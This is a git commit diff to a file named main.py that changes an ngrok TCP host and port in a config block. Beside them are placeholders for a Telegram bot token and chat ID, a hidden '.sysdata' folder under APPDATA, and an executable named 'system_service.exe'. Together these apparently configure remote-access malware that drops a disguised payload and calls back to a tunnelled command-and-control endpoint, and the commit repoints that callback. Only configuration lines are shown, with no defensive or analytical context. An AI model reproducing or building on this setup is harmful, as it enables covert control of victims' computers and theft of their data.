827281d9a314e744cc6f1b82ffb536dd38d6c8a5
spampanda01 <127202960+spampanda01@users.noreply.github.com>
2025-06-23 14:35:45 +0100

    Update main.py

--- main.py
+++ main.py
@@ -41,8 +41,8 @@ def single_instance_check():
 # === CONFIG ===
 BOT_TOKEN = "<<BOT_TOKEN>>"
 CHAT_ID = "<<CHAT_ID>>"
-NGROK_HOST = "2.tcp.eu.ngrok.io"
-NGROK_PORT = 18539
+NGROK_HOST = "7.tcp.eu.ngrok.io"
+NGROK_PORT = 18585
 EXTRACT_FOLDER = os.path.join(os.getenv("APPDATA"), ".sysdata")
 EXE_NAME = "system_service.exe"
 EXE_PATH = os.path.join(EXTRACT_FOLDER, EXE_NAME)
